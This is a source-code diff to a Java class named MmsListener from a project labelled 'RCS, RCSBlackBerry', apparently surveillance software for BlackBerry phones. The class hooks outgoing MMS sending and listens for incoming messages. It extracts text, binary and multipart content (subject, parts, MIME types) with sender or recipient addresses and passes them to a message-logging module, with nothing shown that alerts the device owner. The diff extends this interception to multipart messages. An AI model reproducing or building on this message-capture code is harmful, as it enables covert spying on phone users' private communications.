@@ -6,7 +6,6 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
 
 package blackberry.module.mms;
 
@@ -18,6 +17,8 @@ import javax.wireless.messaging.BinaryMessage;
 import javax.wireless.messaging.Message;
 import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.TextMessage;
+import javax.wireless.messaging.MultipartMessage;
+import javax.wireless.messaging.MessagePart;
 
 import blackberry.Singleton;
 import blackberry.debug.Debug;
@@ -25,25 +26,13 @@ import blackberry.debug.DebugLevel;
 import blackberry.interfaces.iSingleton;
 import blackberry.module.ModuleMessage;
 
-//#ifdef MMS
 import net.rim.blackberry.api.mms.SendListener;
 import net.rim.blackberry.api.mms.MMS;
-public class MmsListener implements iSingleton, SendListener 
-//#else
-    public class MmsListener implements iSingleton 
-//#endif
-    {
-    
-    //#ifndef MMS
-    class MMSMock{
-        void  addSendListener(Object obj){};
-        void removeSendListener(Object obj){};
-    };
-    
-    MMSMock MMS;
-    
-    //#endif
-    
+
+public class MmsListener implements iSingleton, SendListener
+
+{
+
     //#ifdef DEBUG
     private static Debug debug = new Debug("MmsListener", DebugLevel.VERBOSE);
     //#endif
@@ -51,6 +40,8 @@ public class MmsListener implements iSingleton, SendListener
     private static MmsListener instance;
 
     private MessageConnection _mc;
+    private ListeningThread _listener;
+
     private boolean _stop = false;
 
     public synchronized static MmsListener getInstance() {
@@ -67,17 +58,19 @@ public class MmsListener implements iSingleton, SendListener
         return instance;
     }
 
-    private ModuleMessage moduleMessage;
-    private ListeningThread _listener;
-
-    public void start(ModuleMessage moduleMessage) {
-        this.moduleMessage = moduleMessage;
+    public void start() {
+        //#ifdef DEBUG
+        debug.trace("start");
+        //#endif
         _listener = new ListeningThread();
         _listener.start();
         MMS.addSendListener(this);
     }
 
     public void stop() {
+        //#ifdef DEBUG
+        debug.trace("stop");
+        //#endif
         _listener.stop();
         _listener = null;
         //#ifdef DEBUG
@@ -86,33 +79,39 @@ public class MmsListener implements iSingleton, SendListener
         MMS.removeSendListener(this);
     }
 
-    private byte[] getSmsDataMessage(
+    private byte[] getMmsDataMessage(
             final javax.wireless.messaging.Message message) {
-    
+
         byte[] dataMsg = null;
-    
+
         if (message instanceof TextMessage) {
+            //#ifdef DEBUG
+            debug.trace("getMmsDataMessage: TextMessage");
+            //#endif
             final TextMessage tm = (TextMessage) message;
             final String msg = tm.getPayloadText();
             //#ifdef DEBUG
-            debug.info("Got Text SMS: " + msg);
+            debug.info("Got Text MMS: " + msg);
             //#endif
-    
+
             dataMsg = msg.getBytes();
-    
+
         } else if (message instanceof BinaryMessage) {
+            //#ifdef DEBUG
+            debug.trace("getMmsDataMessage: BinaryMessage");
+            //#endif
             dataMsg = ((BinaryMessage) message).getPayloadData();
-    
+
             try {
-    
+
                 //String msg16 = new String(data, "UTF-16BE");
                 final String msg8 = new String(dataMsg, "UTF-8");
-    
+
                 //#ifdef DEBUG
                 //debug.trace("saveLog msg16:" + msg16);
                 debug.trace("saveLog msg8:" + msg8);
                 //#endif
-    
+
             } catch (final UnsupportedEncodingException e) {
                 //#ifdef DEBUG
                 debug.error("saveLog:" + e);
@@ -121,23 +120,57 @@ public class MmsListener implements iSingleton, SendListener
             //#ifdef DEBUG
             debug.info("Got Binary SMS, len: " + dataMsg.length);
             //#endif
+        } else if (message instanceof MultipartMessage) {
+            //#ifdef DEBUG
+            debug.trace("getMmsDataMessage, MultipartMessage");
+            //#endif
+
+            MultipartMessage mm = (MultipartMessage) message;
+
+            String subject = mm.getSubject();
+            //String[] addresses= mm.getAddresses();
+            MessagePart[] parts = mm.getMessageParts();
+
+            //#ifdef DEBUG
+            debug.trace("getMmsDataMessage, subject: " + subject);
+            //#endif
+
+            for (int i = 0; i < parts.length; i++) {
+                MessagePart part = parts[i];
+                //#ifdef DEBUG
+                debug.trace("getMmsDataMessage, parts(" + i + ") id: "
+                        + part.getContentID() + " mime: " + part.getMIMEType()
+                        + " content: " + part.getContent());
+                //#endif
+            }
+
+        } else {
+            //#ifdef DEBUG
+            debug.trace("getMmsDataMessage: unknown type: " + message);
+            //#endif
         }
         return dataMsg;
     }
 
     public boolean sendMessage(Message message) {
+        //#ifdef DEBUG
+        debug.trace("sendMessage");
+        //#endif
+        return manageMessage(message);
+    }
 
+    private boolean manageMessage(Message message) {
         try {
-            final byte[] dataMsg = getSmsDataMessage(message);
+            final byte[] dataMsg = getMmsDataMessage(message);
             String address = message.getAddress();
 
-            moduleMessage.onNewMms(dataMsg, address, true);
+            ModuleMessage.getInstance().onNewMms(dataMsg, address, true);
             return true;
         } catch (Exception e) {
             //#ifdef DEBUG
             debug.error("sendMessage");
             //#endif
-            
+
             return false;
         }
     }
@@ -178,8 +211,14 @@ public class MmsListener implements iSingleton, SendListener
                         //#endif
                         return;
                     }
+                  //#ifdef DEBUG
+                    debug.trace("run: receiving");
+                    //#endif
                     Message message = _mc.receive();
-                    sendMessage(message);
+                    //#ifdef DEBUG
+                    debug.trace("run: received");
+                    //#endif
+                    manageMessage(message);
 
                 }
             } catch (Exception e) {
